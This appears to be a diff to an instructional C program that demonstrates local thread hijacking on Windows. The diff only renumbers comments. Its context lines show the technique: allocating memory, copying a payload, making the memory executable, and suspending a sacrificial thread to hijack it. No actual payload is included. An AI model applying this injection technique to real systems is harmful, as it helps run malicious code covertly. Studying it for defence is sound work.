@@ -56,7 +56,7 @@ BOOL LocalThreadHijack(IN HANDLE hTargetThread, IN PBYTE pPayload, IN SIZE_T sPa
 		printf("VirtualAlloc failed. Error: %d \n", GetLastError());
 	}
 
-	// Copying payload in to the memory we allocated on line 29
+	// Copying payload in to the memory we allocated on line 54
 	memcpy(pPayloadAddress, pPayload, sPayloadSize);
 
 	// Changing the memory protection (to allow excecution)
@@ -90,7 +90,7 @@ void main() {
 
 	// Step 1. Creating the sacrificial thread that contains a benign function
 	// Remember - the third paramter of CreateThread requires a pointer to a function
-	// In this case it is our benign function created on line 14
+	// In this case it is our benign function created on line 34
 	hSacrificialThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&BenignFunction, NULL, 0, &lpThreadId);
 	if (hSacrificialThread == NULL) {
 		printf("CreateThread failed. Error: %d \n", GetLastError());
@@ -99,14 +99,14 @@ void main() {
 
 	printf("Sacrificial thread running. Thread ID: %d \n", lpThreadId);
 
-	// Wait for user to press ENTER to suspend the thread created on line 79
+	// Wait for user to press ENTER to suspend the thread created on line 94
 	printf("Press [ENTER] to suspend sacrificial thread %d \n", lpThreadId);
 	getchar();
 	
 	SuspendThread(hSacrificialThread);
 	// Now that the thread is suspended we can move on to...
-	// Step 2. Use our LocalThreadHijack function created on line 21
-	// The first parameter is the thread we want to hijack (the one we created on line 81)
+	// Step 2. Use our LocalThreadHijack function created on line 41
+	// The first parameter is the thread we want to hijack (the one we created on line 94)
 	// The second parameter is the payload
 	// The third parameter is the size of the payload
 	printf("Sacrificial thread suspended\n Press [ENTER] to hijack the thread\n");
